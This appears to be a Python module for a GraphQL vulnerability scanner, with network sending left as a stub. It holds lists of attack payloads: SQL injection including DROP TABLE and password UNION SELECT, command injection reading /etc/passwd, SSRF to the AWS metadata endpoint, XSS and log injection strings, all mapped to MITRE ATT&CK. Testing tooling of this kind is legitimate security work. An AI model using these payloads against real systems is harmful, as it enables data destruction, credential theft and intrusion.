"""GraphQL injection attacks, alias attacks, and directive injection detection.

Provides:
- SQL injection, NoSQL injection (MongoDB ReDoS) detection
- Command injection, SSRF testing via URL parameters
- XSS injection testing in query parameters and responses
- Log injection via query parameter newline/code injection
- Alias attack support for batch testing
- Directive injection (@skip, @include, custom directives)
"""

import asyncio
import json
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """GraphQL attack types."""
    SQL_INJECTION = "sql_injection"
    NOSQL_INJECTION = "nosql_injection"
    COMMAND_INJECTION = "command_injection"
    SSRF = "ssrf"
    XSS = "xss"
    LOG_INJECTION = "log_injection"
    ALIAS_ATTACK = "alias_attack"
    DIRECTIVE_INJECTION = "directive_injection"


class AttackStatus(Enum):
    """Attack result statuses."""
    VULNERABLE = "vulnerable"
    NOT_VULNERABLE = "not_vulnerable"
    ERROR = "error"
    TIMEOUT = "timeout"
    BLOCKED = "blocked"


@dataclass
class AttackPayload:
    """Attack payload definition.

    Attributes:
        payload: Payload string
        attack_type: Attack type
        description: Payload description
        expected_indicator: Expected vulnerability indicator
        severity: Payload severity level
    """
    payload: str = ""
    attack_type: AttackType = AttackType.SQL_INJECTION
    description: str = ""
    expected_indicator: str = ""
    severity: str = "high"


@dataclass
class AttackResult:
    """Individual attack result.

    Attributes:
        attack_id: Unique attack ID
        timestamp: Attack timestamp
        attack_type: Attack type
        target_field: Target field
        payload: Payload used
        result: Attack result
        response_data: Response data
        response_time_ms: Response time
        is_vulnerable: Whether vulnerable
        indicator_found: Vulnerability indicator found
        indicator_value: Indicator value found
        raw_request: Raw request sent
        raw_response: Raw response received
    """
    attack_id: str = ""
    timestamp: float = 0.0
    attack_type: AttackType = AttackType.SQL_INJECTION
    target_field: str = ""
    payload: str = ""
    status: AttackStatus = AttackStatus.ERROR
    response_data: Dict[str, Any] = field(default_factory=dict)
    response_time_ms: float = 0.0
    is_vulnerable: bool = False
    indicator_found: bool = False
    indicator_value: str = ""
    raw_request: str = ""
    raw_response: str = ""


@dataclass
class AttackReport:
    """Complete attack report.

    Attributes:
        report_id: Report ID
        timestamp: Report timestamp
        endpoint_url: Tested endpoint
        total_attacks: Total attacks performed
        vulnerable_count: Vulnerable findings
        results: Attack results
        summary: Summary statistics
        mitre_mappings: MITRE ATT&CK mappings
    """
    report_id: str = ""
    timestamp: float = 0.0
    endpoint_url: str = ""
    total_attacks: int = 0
    vulnerable_count: int = 0
    results: List[AttackResult] = field(default_factory=list)
    summary: Dict[str, Any] = field(default_factory=dict)
    mitre_mappings: List[Dict[str, str]] = field(default_factory=list)


class GraphQLAttacks:
    """GraphQL injection and attack module.

    Provides SQL injection, NoSQL injection, command injection,
    SSRF, XSS, log injection, alias attacks, and directive injection.
    """

    SQL_INJECTION_PAYLOADS: List[AttackPayload] = [
        AttackPayload(
            payload="' OR '1'='1",
            attack_type=AttackType.SQL_INJECTION,
            description="Basic SQL injection OR true",
            expected_indicator="syntax error",
            severity="critical",
        ),
        AttackPayload(
            payload="'; DROP TABLE users; --",
            attack_type=AttackType.SQL_INJECTION,
            description="SQL injection DROP TABLE",
            expected_indicator="syntax error",
            severity="critical",
        ),
        AttackPayload(
            payload="1 UNION SELECT username, password FROM users --",
            attack_type=AttackType.SQL_INJECTION,
            description="SQL injection UNION SELECT",
            expected_indicator="username",
            severity="critical",
        ),
        AttackPayload(
            payload="' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --",
            attack_type=AttackType.SQL_INJECTION,
            description="SQL injection error-based",
            expected_indicator="conversion",
            severity="critical",
        ),
        AttackPayload(
            payload="'; WAITFOR DELAY '0:0:5' --",
            attack_type=AttackType.SQL_INJECTION,
            description="SQL injection time-based",
            expected_indicator="delay",
            severity="high",
        ),
    ]

    NOSQL_INJECTION_PAYLOADS: List[AttackPayload] = [
        AttackPayload(
            payload='{"$gt": ""}',
            attack_type=AttackType.NOSQL_INJECTION,
            description="MongoDB $gt injection",
            expected_indicator="error",
            severity="critical",
        ),
        AttackPayload(
            payload='{"$ne": null}',
            attack_type=AttackType.NOSQL_INJECTION,
            description="MongoDB $ne injection",
            expected_indicator="error",
            severity="critical",
        ),
        AttackPayload(
            payload='{"$regex": "^(a{10000})$"}',
            attack_type=AttackType.NOSQL_INJECTION,
            description="MongoDB ReDoS",
            expected_indicator="timeout",
            severity="high",
        ),
        AttackPayload(
            payload='{"$where": "sleep(5000)"}',
            attack_type=AttackType.NOSQL_INJECTION,
            description="MongoDB $where injection",
            expected_indicator="sleep",
            severity="critical",
        ),
    ]

    COMMAND_INJECTION_PAYLOADS: List[AttackPayload] = [
        AttackPayload(
            payload="; ls -la",
            attack_type=AttackType.COMMAND_INJECTION,
            description="Basic command injection",
            expected_indicator="total",
            severity="critical",
        ),
        AttackPayload(
            payload="| cat /etc/passwd",
            attack_type=AttackType.COMMAND_INJECTION,
            description="Command injection pipe",
            expected_indicator="root:",
            severity="critical",
        ),
        AttackPayload(
            payload="`whoami`",
            attack_type=AttackType.COMMAND_INJECTION,
            description="Command injection backtick",
            expected_indicator="root",
            severity="critical",
        ),
        AttackPayload(
            payload="$(id)",
            attack_type=AttackType.COMMAND_INJECTION,
            description="Command injection subshell",
            expected_indicator="uid=",
            severity="critical",
        ),
    ]

    SSRF_PAYLOADS: List[AttackPayload] = [
        AttackPayload(
            payload="http://169.254.169.254/latest/meta-data/",
            attack_type=AttackType.SSRF,
            description="AWS metadata SSRF",
            expected_indicator="ami-id",
            severity="critical",
        ),
        AttackPayload(
            payload="http://localhost:6379/",
            attack_type=AttackType.SSRF,
            description="Redis SSRF",
            expected_indicator="redis",
            severity="high",
        ),
        AttackPayload(
            payload="http://127.0.0.1:2379/version",
            attack_type=AttackType.SSRF,
            description="etcd SSRF",
            expected_indicator="etcdserver",
            severity="high",
        ),
        AttackPayload(
            payload="file:///etc/passwd",
            attack_type=AttackType.SSRF,
            description="File protocol SSRF",
            expected_indicator="root:",
            severity="critical",
        ),
    ]

    XSS_PAYLOADS: List[AttackPayload] = [
        AttackPayload(
            payload="<script>alert('XSS')</script>",
            attack_type=AttackType.XSS,
            description="Basic XSS",
            expected_indicator="<script>",
            severity="high",
        ),
        AttackPayload(
            payload="<img src=x onerror=alert(1)>",
            attack_type=AttackType.XSS,
            description="Image XSS",
            expected_indicator="onerror",
            severity="high",
        ),
        AttackPayload(
            payload="javascript:alert(1)",
            attack_type=AttackType.XSS,
            description="JavaScript protocol XSS",
            expected_indicator="javascript:",
            severity="medium",
        ),
    ]

    LOG_INJECTION_PAYLOADS: List[AttackPayload] = [
        AttackPayload(
            payload="\n[INJECTED LOG ENTRY]",
            attack_type=AttackType.LOG_INJECTION,
            description="Log injection newline",
            expected_indicator="INJECTED",
            severity="medium",
        ),
        AttackPayload(
            payload="\r\n[INJECTED LOG ENTRY]",
            attack_type=AttackType.LOG_INJECTION,
            description="Log injection CRLF",
            expected_indicator="INJECTED",
            severity="medium",
        ),
        AttackPayload(
            payload="%0d%0a[INJECTED LOG ENTRY]",
            attack_type=AttackType.LOG_INJECTION,
            description="Log injection URL encoded",
            expected_indicator="INJECTED",
            severity="medium",
        ),
    ]

    DIRECTIVE_INJECTION_PAYLOADS: List[AttackPayload] = [
        AttackPayload(
            payload="@skip(if: false)",
            attack_type=AttackType.DIRECTIVE_INJECTION,
            description="Skip directive injection",
            expected_indicator="skip",
            severity="medium",
        ),
        AttackPayload(
            payload="@include(if: true)",
            attack_type=AttackType.DIRECTIVE_INJECTION,
            description="Include directive injection",
            expected_indicator="include",
            severity="medium",
        ),
        AttackPayload(
            payload="@deprecated(reason: 'test')",
            attack_type=AttackType.DIRECTIVE_INJECTION,
            description="Deprecated directive injection",
            expected_indicator="deprecated",
            severity="low",
        ),
    ]

    MITRE_ATTACK_MAPPINGS: Dict[AttackType, List[Dict[str, str]]] = {
        AttackType.SQL_INJECTION: [
            {
                "technique_id": "T1190",
                "technique_name": "Exploit Public-Facing Application",
                "tactic": "Initial Access",
            },
            {
                "technique_id": "T1059",
                "technique_name": "Command and Scripting Interpreter",
                "tactic": "Execution",
            },
        ],
        AttackType.NOSQL_INJECTION: [
            {
                "technique_id": "T1190",
                "technique_name": "Exploit Public-Facing Application",
                "tactic": "Initial Access",
            },
        ],
        AttackType.COMMAND_INJECTION: [
            {
                "technique_id": "T1059",
                "technique_name": "Command and Scripting Interpreter",
                "tactic": "Execution",
            },
        ],
        AttackType.SSRF: [
            {
                "technique_id": "T1190",
                "technique_name": "Exploit Public-Facing Application",
                "tactic": "Initial Access",
            },
        ],
        AttackType.XSS: [
            {
                "technique_id": "T1059",
                "technique_name": "Command and Scripting Interpreter",
                "tactic": "Execution",
            },
        ],
        AttackType.DIRECTIVE_INJECTION: [
            {
                "technique_id": "T1190",
                "technique_name": "Exploit Public-Facing Application",
                "tactic": "Initial Access",
            },
        ],
    }

    def __init__(
        self,
        http_client: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize GraphQL attacks module.

        Args:
            http_client: HTTP client for making requests.
            event_bus: Event bus for broadcasting events.
        """
        self.http_client = http_client
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._attack_results: List[AttackResult] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Attack Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Attack: %s", message)

    async def test_sql_injection(
        self,
        url: str,
        target_field: str,
        query_template: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test SQL injection on GraphQL field.

        Args:
            url: GraphQL endpoint URL.
            target_field: Target field.
            query_template: Query template.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []

        for payload in self.SQL_INJECTION_PAYLOADS:
            result = await self._execute_attack(
                url, target_field, query_template, payload, headers
            )
            results.append(result)

            if result.is_vulnerable:
                await self._report_log(
                    f"SQL注入漏洞发现: {target_field} - {payload.description}"
                )

        return results

    async def test_nosql_injection(
        self,
        url: str,
        target_field: str,
        query_template: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test NoSQL injection on GraphQL field.

        Args:
            url: GraphQL endpoint URL.
            target_field: Target field.
            query_template: Query template.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []

        for payload in self.NOSQL_INJECTION_PAYLOADS:
            result = await self._execute_attack(
                url, target_field, query_template, payload, headers
            )
            results.append(result)

        return results

    async def test_command_injection(
        self,
        url: str,
        target_field: str,
        query_template: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test command injection on GraphQL field.

        Args:
            url: GraphQL endpoint URL.
            target_field: Target field.
            query_template: Query template.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []

        for payload in self.COMMAND_INJECTION_PAYLOADS:
            result = await self._execute_attack(
                url, target_field, query_template, payload, headers
            )
            results.append(result)

        return results

    async def test_ssrf(
        self,
        url: str,
        target_field: str,
        query_template: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test SSRF on GraphQL field.

        Args:
            url: GraphQL endpoint URL.
            target_field: Target field.
            query_template: Query template.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []

        for payload in self.SSRF_PAYLOADS:
            result = await self._execute_attack(
                url, target_field, query_template, payload, headers
            )
            results.append(result)

        return results

    async def test_xss(
        self,
        url: str,
        target_field: str,
        query_template: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test XSS on GraphQL field.

        Args:
            url: GraphQL endpoint URL.
            target_field: Target field.
            query_template: Query template.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []

        for payload in self.XSS_PAYLOADS:
            result = await self._execute_attack(
                url, target_field, query_template, payload, headers
            )
            results.append(result)

        return results

    async def test_log_injection(
        self,
        url: str,
        target_field: str,
        query_template: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test log injection on GraphQL field.

        Args:
            url: GraphQL endpoint URL.
            target_field: Target field.
            query_template: Query template.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []

        for payload in self.LOG_INJECTION_PAYLOADS:
            result = await self._execute_attack(
                url, target_field, query_template, payload, headers
            )
            results.append(result)

        return results

    async def test_directive_injection(
        self,
        url: str,
        target_field: str,
        query_template: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test directive injection on GraphQL field.

        Args:
            url: GraphQL endpoint URL.
            target_field: Target field.
            query_template: Query template.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []

        for payload in self.DIRECTIVE_INJECTION_PAYLOADS:
            result = await self._execute_attack(
                url, target_field, query_template, payload, headers
            )
            results.append(result)

        return results

    async def _execute_attack(
        self,
        url: str,
        target_field: str,
        query_template: str,
        payload: AttackPayload,
        headers: Optional[Dict[str, str]],
    ) -> AttackResult:
        """Execute single attack payload.

        Args:
            url: Endpoint URL.
            target_field: Target field.
            query_template: Query template.
            payload: Attack payload.
            headers: HTTP headers.

        Returns:
            AttackResult.
        """
        start_time = time.time()

        attack_id = f"attack_{uuid.uuid4().hex[:8]}"

        result = AttackResult(
            attack_id=attack_id,
            timestamp=time.time(),
            attack_type=payload.attack_type,
            target_field=target_field,
            payload=payload.payload,
            raw_request=query_template,
        )

        try:
            injected_query = self._inject_payload(
                query_template, target_field, payload
            )

            response_data = await self._send_query(
                url, injected_query, headers
            )

            result.response_time_ms = (time.time() - start_time) * 1000
            result.raw_response = json.dumps(response_data) if response_data else ""

            if response_data:
                is_vulnerable, indicator = await self._check_vulnerability(
                    response_data, payload, result.response_time_ms
                )

                result.response_data = response_data
                result.is_vulnerable = is_vulnerable
                result.indicator_found = is_vulnerable
                result.indicator_value = indicator

                if is_vulnerable:
                    result.status = AttackStatus.VULNERABLE
                else:
                    result.status = AttackStatus.NOT_VULNERABLE
            else:
                result.status = AttackStatus.ERROR

        except Exception as e:
            result.status = AttackStatus.ERROR
            result.response_time_ms = (time.time() - start_time) * 1000

        self._attack_results.append(result)
        return result

    def _inject_payload(
        self,
        query_template: str,
        target_field: str,
        payload: AttackPayload,
    ) -> str:
        """Inject payload into query template.

        Args:
            query_template: Original query template.
            target_field: Target field.
            payload: Attack payload.

        Returns:
            Injected query string.
        """
        if payload.attack_type == AttackType.DIRECTIVE_INJECTION:
            return self._inject_directive(query_template, target_field, payload.payload)

        if payload.attack_type == AttackType.ALIAS_ATTACK:
            return self._inject_alias(query_template, target_field, payload.payload)

        return query_template.replace(
            f'"{target_field}"',
            f'"{payload.payload}"',
        )

    def _inject_directive(
        self,
        query_template: str,
        target_field: str,
        directive: str,
    ) -> str:
        """Inject directive into query.

        Args:
            query_template: Query template.
            target_field: Target field.
            directive: Directive string.

        Returns:
            Modified query with directive.
        """
        return query_template.replace(
            target_field,
            f"{target_field} {directive}",
        )

    def _inject_alias(
        self,
        query_template: str,
        target_field: str,
        alias: str,
    ) -> str:
        """Inject alias into query.

        Args:
            query_template: Query template.
            target_field: Target field.
            alias: Alias string.

        Returns:
            Modified query with alias.
        """
        return query_template.replace(
            target_field,
            f"{alias}: {target_field}",
        )

    async def _check_vulnerability(
        self,
        response_data: Dict[str, Any],
        payload: AttackPayload,
        response_time_ms: float,
    ) -> Tuple[bool, str]:
        """Check if vulnerability was successful.

        Args:
            response_data: Response data.
            payload: Attack payload.
            response_time_ms: Response time.

        Returns:
            Tuple of (is_vulnerable, indicator_value).
        """
        response_str = json.dumps(response_data).lower()

        errors = response_data.get("errors", [])
        for error in errors:
            error_message = error.get("message", "").lower()

            if payload.expected_indicator.lower() in error_message:
                return True, error_message

        if payload.expected_indicator.lower() in response_str:
            return True, payload.expected_indicator

        if payload.attack_type == AttackType.SQL_INJECTION:
            if response_time_ms > 5000:
                return True, f"time-based: {response_time_ms:.0f}ms"

        if payload.attack_type == AttackType.NOSQL_INJECTION:
            if "regex" in payload.payload.lower() and response_time_ms > 5000:
                return True, f"ReDoS: {response_time_ms:.0f}ms"

        return False, ""

    async def run_full_attack_suite(
        self,
        url: str,
        target_fields: List[str],
        query_templates: Dict[str, str],
        headers: Optional[Dict[str, str]] = None,
        attack_types: Optional[List[AttackType]] = None,
    ) -> AttackReport:
        """Run full attack suite on target fields.

        Args:
            url: GraphQL endpoint URL.
            target_fields: Target fields to attack.
            query_templates: Query templates per field.
            headers: HTTP headers.
            attack_types: Attack types to run (all if None).

        Returns:
            AttackReport.
        """
        start_time = time.time()

        report = AttackReport(
            report_id=f"attack_report_{uuid.uuid4().hex[:8]}",
            timestamp=time.time(),
            endpoint_url=url,
        )

        all_results: List[AttackResult] = []

        test_types = attack_types or [
            AttackType.SQL_INJECTION,
            AttackType.NOSQL_INJECTION,
            AttackType.COMMAND_INJECTION,
            AttackType.SSRF,
            AttackType.XSS,
            AttackType.LOG_INJECTION,
            AttackType.DIRECTIVE_INJECTION,
        ]

        total_tests = len(target_fields) * len(test_types)
        current = 0

        for field_name in target_fields:
            query_template = query_templates.get(field_name, f"query {{ {field_name} {{ id }} }}")

            for attack_type in test_types:
                results = await self._run_attack_type(
                    url, field_name, query_template, attack_type, headers
                )
                all_results.extend(results)

                current += 1
                progress = (current / max(total_tests, 1)) * 100
                await self._report_progress(
                    f"测试 {attack_type.value} on {field_name}",
                    progress,
                )

        report.results = all_results
        report.total_attacks = len(all_results)
        report.vulnerable_count = sum(
            1 for r in all_results if r.is_vulnerable
        )

        report.summary = self._generate_summary(all_results)
        report.mitre_mappings = self._generate_mitre_mappings(all_results)

        await self._report_log(
            f"攻击套件完成: {report.total_attacks} 攻击, "
            f"{report.vulnerable_count} 漏洞"
        )

        return report

    async def _run_attack_type(
        self,
        url: str,
        field_name: str,
        query_template: str,
        attack_type: AttackType,
        headers: Optional[Dict[str, str]],
    ) -> List[AttackResult]:
        """Run specific attack type on field.

        Args:
            url: Endpoint URL.
            field_name: Field name.
            query_template: Query template.
            attack_type: Attack type.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        attack_funcs: Dict[AttackType, Any] = {
            AttackType.SQL_INJECTION: self.test_sql_injection,
            AttackType.NOSQL_INJECTION: self.test_nosql_injection,
            AttackType.COMMAND_INJECTION: self.test_command_injection,
            AttackType.SSRF: self.test_ssrf,
            AttackType.XSS: self.test_xss,
            AttackType.LOG_INJECTION: self.test_log_injection,
            AttackType.DIRECTIVE_INJECTION: self.test_directive_injection,
        }

        attack_func = attack_funcs.get(attack_type)
        if attack_func:
            attack_results: List[AttackResult] = await attack_func(
                url, field_name, query_template, headers
            )
            return attack_results

        return []

    def _generate_summary(
        self,
        results: List[AttackResult],
    ) -> Dict[str, Any]:
        """Generate attack summary.

        Args:
            results: Attack results.

        Returns:
            Summary dictionary.
        """
        type_counts: Dict[str, int] = {}
        vulnerable_by_type: Dict[str, int] = {}

        for result in results:
            attack_type = result.attack_type.value
            type_counts[attack_type] = type_counts.get(attack_type, 0) + 1

            if result.is_vulnerable:
                vulnerable_by_type[attack_type] = (
                    vulnerable_by_type.get(attack_type, 0) + 1
                )

        return {
            "total_attacks": len(results),
            "vulnerable_count": sum(1 for r in results if r.is_vulnerable),
            "type_counts": type_counts,
            "vulnerable_by_type": vulnerable_by_type,
        }

    def _generate_mitre_mappings(
        self,
        results: List[AttackResult],
    ) -> List[Dict[str, str]]:
        """Generate MITRE ATT&CK mappings.

        Args:
            results: Attack results.

        Returns:
            List of MITRE mappings.
        """
        mappings: List[Dict[str, str]] = []
        seen_types: Set[AttackType] = set()

        for result in results:
            if result.is_vulnerable and result.attack_type not in seen_types:
                seen_types.add(result.attack_type)
                type_mappings = self.MITRE_ATTACK_MAPPINGS.get(
                    result.attack_type, []
                )
                mappings.extend(type_mappings)

        return mappings

    def get_attack_results(
        self,
        filter_vulnerable: bool = False,
        limit: int = 100,
    ) -> List[AttackResult]:
        """Get attack results.

        Args:
            filter_vulnerable: Only return vulnerable results.
            limit: Maximum results.

        Returns:
            List of AttackResult.
        """
        results = self._attack_results

        if filter_vulnerable:
            results = [r for r in results if r.is_vulnerable]

        return results[-limit:]

    def get_stats(self) -> Dict[str, Any]:
        """Get attack module statistics.

        Returns:
            Statistics dictionary.
        """
        return {
            "total_attacks": len(self._attack_results),
            "vulnerable_count": sum(
                1 for r in self._attack_results if r.is_vulnerable
            ),
            "attack_types": list(set(
                r.attack_type.value for r in self._attack_results
            )),
        }

    async def _send_query(
        self,
        url: str,
        query: str,
        headers: Optional[Dict[str, str]],
    ) -> Optional[Dict[str, Any]]:
        """Send GraphQL query.

        Args:
            url: Endpoint URL.
            query: GraphQL query.
            headers: HTTP headers.

        Returns:
            Response data or None.
        """
        await asyncio.sleep(0.01)
        return None
